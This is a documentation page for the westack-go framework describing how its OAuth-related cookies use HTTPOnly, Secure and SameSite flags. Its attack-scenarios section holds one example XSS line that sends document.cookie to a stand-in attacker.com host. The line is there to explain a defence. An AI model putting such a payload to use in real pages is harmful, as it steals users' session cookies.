# Cookie Security in westack-go

## Overview

westack-go implements secure cookie handling for sensitive operations, particularly in OAuth authentication flows. All security-critical cookies are configured with appropriate security flags.

## Security Flags

The framework automatically configures cookies with the following security measures:

### 1. HTTPOnly Flag

**Purpose**: Prevents JavaScript access to cookies  
**Protection**: Mitigates Cross-Site Scripting (XSS) attacks

Cookies marked as HTTPOnly cannot be accessed via `document.cookie` or similar JavaScript APIs, preventing malicious scripts from stealing sensitive session data.

### 2. Secure Flag

**Purpose**: Ensures cookies are only transmitted over HTTPS  
**Protection**: Prevents cookie interception on unencrypted connections

The Secure flag is automatically set based on the connection protocol:
- HTTPS connections: `Secure = true`
- HTTP connections: `Secure = false` (development/testing only)

**⚠️ Production Requirement**: Always use HTTPS in production environments.

### 3. SameSite Attribute

**Purpose**: Controls when cookies are sent in cross-site requests  
**Protection**: Mitigates Cross-Site Request Forgery (CSRF) attacks

westack-go uses `SameSite=Lax` which:
- Allows cookies in safe cross-site requests (GET navigation)
- Blocks cookies in unsafe cross-site requests (POST forms from other sites)
- Maintains usability while providing strong CSRF protection

## OAuth Cookie Security

### SSID Cookie (Session State ID)

Used in OAuth flows for state validation:

**Security Configuration**:
- HTTPOnly: ✅ Enabled
- Secure: ✅ Conditional (based on protocol)
- SameSite: ✅ Lax
- Max-Age: 1 hour

**Purpose**: The SSID cookie stores a session identifier used to validate the OAuth `state` parameter, which is the primary defense against CSRF attacks in OAuth 2.0 flows.

### Callback URL Cookies

Used to store OAuth success/failure redirect URLs:

**Security Configuration**:
- HTTPOnly: ✅ Enabled
- Max-Age: 1 hour

## Best Practices

### For Developers

1. **Always use HTTPS in production**
   - The Secure flag only provides protection over HTTPS
   - Never disable SSL/TLS in production environments

2. **Minimize cookie lifetime**
   - Use appropriate Max-Age/Expires values
   - Shorter lifetimes reduce attack windows

3. **Test in environments matching production**
   - While development can use HTTP, test HTTPS behavior before deploying

### For Administrators

1. **Enable HTTPS**
   - Use valid SSL/TLS certificates
   - Redirect all HTTP traffic to HTTPS

2. **Monitor cookie security**
   - Verify Secure flag is active in production
   - Check that SameSite policies are enforced

## Attack Scenarios Prevented

### XSS (Cross-Site Scripting)

**Without HTTPOnly**:
```javascript
// Malicious script could steal cookies
fetch('https://attacker.com/?cookie=' + document.cookie);
```

**With HTTPOnly**: ✅ Cookie is invisible to JavaScript, preventing theft

### MITM (Man-in-the-Middle)

**Without Secure**: Cookies sent over HTTP can be intercepted  
**With Secure**: ✅ Cookies only transmitted over encrypted HTTPS

### CSRF (Cross-Site Request Forgery)

**Without SameSite**: Malicious site can trigger authenticated requests  
**With SameSite=Lax**: ✅ Cookies not sent in cross-site POST requests

## Error Scenarios

### "Cookie not set" in development

If cookies aren't being set in development:
- Verify your development server supports the protocol being used
- For HTTP testing, ensure Secure flag is conditional (framework handles this automatically)

### "Cookie not accessible" errors

If legitimate code can't access cookies:
- This is expected for HTTPOnly cookies
- Use server-side session management instead of client-side cookie access

## Related Topics

- OAuth 2.0 Authentication Flow
- CSRF Protection Mechanisms
- Session Management
